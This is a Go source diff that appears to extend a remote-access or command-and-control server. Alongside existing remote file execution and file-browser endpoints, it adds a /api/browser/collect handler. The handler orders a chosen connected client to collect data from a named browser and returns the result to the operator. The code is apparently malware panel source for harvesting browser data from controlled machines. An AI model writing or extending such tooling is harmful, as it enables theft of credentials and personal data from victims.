@@ -98,6 +98,9 @@ type Client struct {
 	// Remote File Execution
 	RFEResult     string
 	RFEReady      bool
+	// Browser Data
+	BrowserResult string
+	BrowserReady  bool
 }
 
 func (c *Client) updatePong() {
@@ -402,6 +405,12 @@ func handleTCPClient(conn net.Conn) {
 			client.mu.Lock()
 			client.RFEResult = data
 			client.RFEReady  = true
+			client.mu.Unlock()
+		case strings.HasPrefix(line, "[browser_result]"):
+			data := strings.TrimPrefix(line, "[browser_result]")
+			client.mu.Lock()
+			client.BrowserResult = data
+			client.BrowserReady  = true
 			client.mu.Unlock()
 		case strings.HasPrefix(line, "[ls_result]"),
 			strings.HasPrefix(line, "[download_result]"),
@@ -1052,6 +1061,53 @@ func apiRFEHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 // ─── Main ─────────────────────────────────────────────────
+// POST /api/browser/collect { "id":"...", "browser":"..." }
+func apiBrowserCollectHandler(w http.ResponseWriter, r *http.Request) {
+	if !isAuthenticated(r) {
+		http.Error(w, "Unauthorized", 401)
+		return
+	}
+	var req struct {
+		ID      string `json:"id"`
+		Browser string `json:"browser"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		http.Error(w, "bad request", 400)
+		return
+	}
+	client := getClientByID(req.ID)
+	if client == nil {
+		http.Error(w, "client bulunamadı", 404)
+		return
+	}
+
+	client.mu.Lock()
+	client.BrowserReady  = false
+	client.BrowserResult = ""
+	client.mu.Unlock()
+
+	cmd := fmt.Sprintf("[browser_collect]%s", req.Browser)
+	if err := sendCommandByID(req.ID, cmd); err != nil {
+		http.Error(w, err.Error(), 500)
+		return
+	}
+
+	deadline := time.Now().Add(30 * time.Second)
+	for time.Now().Before(deadline) {
+		client.mu.Lock()
+		ready  := client.BrowserReady
+		result := client.BrowserResult
+		client.mu.Unlock()
+		if ready {
+			w.Header().Set("Content-Type", "application/json")
+			fmt.Fprint(w, result)
+			return
+		}
+		time.Sleep(200 * time.Millisecond)
+	}
+	http.Error(w, "timeout", 504)
+}
+
 func main() {
 	loadConfig()
 
@@ -1088,6 +1144,7 @@ func main() {
 	http.HandleFunc("/api/fb/upload", apiFBUploadHandler)
 	http.HandleFunc("/api/fb/rename", apiFBRenameHandler)
 	http.HandleFunc("/api/rfe", apiRFEHandler)
+	http.HandleFunc("/api/browser/collect", apiBrowserCollectHandler)
 	http.HandleFunc("/api/settings", apiSettingsHandler)
 	http.HandleFunc("/logout", logoutHandler)
 
